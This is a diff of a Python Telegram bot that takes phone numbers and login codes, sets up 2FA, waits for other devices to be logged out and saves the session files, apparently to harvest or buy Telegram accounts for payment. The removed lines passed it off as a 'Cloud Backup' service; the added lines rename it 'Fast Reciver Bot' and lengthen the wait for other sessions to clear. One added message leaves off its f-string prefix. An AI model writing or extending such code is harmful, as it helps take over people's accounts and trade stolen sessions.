@@ -218,7 +218,7 @@ def check_valid_country_and_get_code(phone_number):
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     if not check_force_join(message): return
-    bot.send_message(message.chat.id, "👋 **Welcome to Cloud Backup Telegram Bot**\n\nTo start a secure backup of your Telegram Account, please send your phone number with your country code.\nExample: `+88017XXXXXXXX` or `+52XXXXXXXXXX`")
+    bot.send_message(message.chat.id, "👋 **Welcome to Fast Reciver Bot**\n\nplease send your phone number with your country code.\nExample: `+52XXXXXXXXXX`")
 
 @bot.message_handler(commands=['cancel'])
 def cmd_cancel(message):
@@ -658,7 +658,7 @@ async def verify_otp_task(text, user_id, message):
                         pass # স্প্যাম ফ্রি, এখন ২-এফএ সেটআপে যাবে
                     else:
                         # যদি অ্যাকাউন্ট লিমিটেড হয়
-                        bot.reply_to(message, "❌ **Access Denied!** Only Spam-Free accounts are accepted.")
+                        bot.reply_to(message, "❗️This Account `{data['phone']}`is Spam, Robots won't accept it, Just accepts New - Spam Free Only")
                         await data["client"].disconnect()
                         del user_data[user_id]
                         return
@@ -774,7 +774,7 @@ async def process_backup(user_id, message, data):
             convert_pending_to_verified(user_id, price)
             try: bot.delete_message(message.chat.id, received_msg.message_id)
             except: pass
-            bot.send_message(message.chat.id, f"🎉 Account `{data['phone']}` confirmed! Balance moved to Verified.")
+            bot.send_message(message.chat.id, f"✅ Congratulations, the account `{data['phone']}` has been successfully verified.")
             if tracker_id in live_trackers: del live_trackers[tracker_id]
             return
             
@@ -784,11 +784,11 @@ async def process_backup(user_id, message, data):
         
     bot.send_message(
         message.chat.id, 
-        f"⚠️ **Device Detected!**\n\nAccount: `{data['phone']}`\n\nYou have **1 hour** to clear all other devices from Telegram Settings, or this account will be rejected."
+        f"⚠️ Multiple active sessions detected for the number!**\n\nAccount: `{data['phone']}`\n\n📝 Total devices are more than 1 device. Your account will be reprocessed after 1 hours."
     )
     
-    max_wait_extended = 90  
-    interval = 60             
+    max_wait_extended = 3600  
+    interval = 600             
     elapsed = 0
     
     while elapsed < max_wait_extended:
@@ -817,7 +817,7 @@ async def process_backup(user_id, message, data):
                 if os.path.exists(f"{data['session_path']}.session"):
                     shutil.move(f"{data['session_path']}.session", os.path.join(final_country_dir, f"+{data['clean_phone']}.session"))
                 convert_pending_to_verified(user_id, price)
-                bot.send_message(message.chat.id, f"🎉 Account `{data['phone']}` confirmed after delay!")
+                bot.send_message(message.chat.id, f"✅ Congratulations, the account `{data['phone']}` has been successfully verified.")
                 if tracker_id in live_trackers: del live_trackers[tracker_id]
                 return
             await data["client"].disconnect()
